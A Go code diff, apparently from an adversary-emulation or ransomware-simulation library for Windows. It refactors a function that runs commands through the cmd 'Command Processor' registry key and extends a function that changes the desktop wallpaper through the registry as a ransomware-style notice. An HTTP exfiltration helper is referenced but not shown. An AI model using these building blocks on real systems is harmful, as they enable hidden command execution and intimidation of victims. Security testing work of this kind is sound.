@@ -10,6 +10,7 @@ import (
 	"io"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"unsafe"
 
@@ -108,7 +109,7 @@ func executeRegistry(cmds []string, clean bool) (string, error) {
 	// Create key
 	k, found, e = registry.CreateKey(
 		registry.CURRENT_USER,
-		"Software\\Microsoft\\Command Processor",
+		filepath.Join("Software", "Microsoft", "Command Processor"),
 		registry.QUERY_VALUE|registry.SET_VALUE,
 	)
 	if e != nil {
@@ -144,7 +145,11 @@ func executeRegistry(cmds []string, clean bool) (string, error) {
 		// Delete key if not found
 		e = registry.DeleteKey(
 			registry.CURRENT_USER,
-			"Software\\Microsoft\\Command Processor",
+			filepath.Join(
+				"Software",
+				"Microsoft",
+				"Command Processor",
+			),
 		)
 		if e != nil {
 			return strings.Join(out, "\n"), e
@@ -165,7 +170,7 @@ func executeRegistry(cmds []string, clean bool) (string, error) {
 }
 
 // ExecuteScript will run shell commands using the provided method, as
-// well as attempt to clean up artificats, if requested.
+// well as attempt to clean up artifacts, if requested.
 func ExecuteScript(
 	method string,
 	clean bool,
@@ -280,35 +285,73 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 }
 
 // WallpaperNotify is a NotifyFunc that sets the background wallpaper.
-func WallpaperNotify(image string, png []byte) NotifyFunc {
+func WallpaperNotify(
+	img string,
+	png []byte,
+	fit string,
+	clean bool,
+) NotifyFunc {
 	return func() error {
 		var e error
 		var f *os.File
+		var k registry.Key
 		var spiSetdeskwallpaper uintptr = 0x0014
 		var spifSendchange uintptr = 0x0002
 		var spifUpdateinifile uintptr = 0x0001
 		var user32 *windows.LazyDLL
 
-		// Create image file
-		if f, e = os.Create(image); e != nil {
+		// Write PNG to file
+		if f, e = os.Create(img); e != nil {
 			return e
 		}
 
-		// Write PNG to file
 		f.Write(png)
 		f.Close()
+
+		// Get key
+		k, _, e = registry.CreateKey(
+			registry.CURRENT_USER,
+			filepath.Join("Control Panel", "Desktop"),
+			registry.SET_VALUE,
+		)
+		if e != nil {
+			return e
+		}
+
+		// Set wallpaper
+		if e = k.SetStringValue("WallPaper", img); e != nil {
+			return e
+		}
+
+		// Set style
+		if e = k.SetStringValue("WallpaperStyle", fit); e != nil {
+			return e
+		}
+
+		// Set tiling
+		switch fit {
+		case DesktopTile:
+			e = k.SetStringValue("TileWallpaper", "1")
+		default:
+			e = k.SetStringValue("TileWallpaper", "0")
+		}
+		if e != nil {
+			return e
+		}
 
 		// Change background with Windows API
 		user32 = windows.NewLazySystemDLL("User32")
 		user32.NewProc("SystemParametersInfoA").Call(
 			spiSetdeskwallpaper,
 			0,
-			uintptr(unsafe.Pointer(&[]byte(image)[0])),
+			uintptr(unsafe.Pointer(&[]byte(img)[0])),
 			spifSendchange|spifUpdateinifile,
 		)
 
-		// Remove image file
-		os.Remove(image)
+		// Remove image file, if requested
+		if clean {
+			os.Remove(img)
+		}
 
 		return nil
 	}
